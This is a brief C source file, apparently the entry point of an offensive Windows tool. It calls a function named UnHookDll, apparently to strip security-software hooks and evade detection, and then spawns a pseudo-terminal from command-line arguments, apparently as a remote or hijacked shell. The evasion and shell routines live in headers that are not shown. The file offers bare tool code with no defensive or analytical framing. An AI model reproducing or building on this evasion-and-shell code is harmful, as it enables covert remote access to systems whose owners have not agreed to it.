#include "evasion.h"
#include "hijacking.h"
#include "spawn.h"

int main(int argc, char* argv[])
{
    int iRes = -1;
    if (argc == 6)
    {
        int iRows = atoi(argv[2]);
        int iCols = atoi(argv[3]);
        UnHookDll();
        iRes = SUCCEEDED(SpawnPty(argv[1], iRows, iCols, argv[4], argv[5])) ? 0 : -1;
        CleanUp();
    }
    return iRes;
}


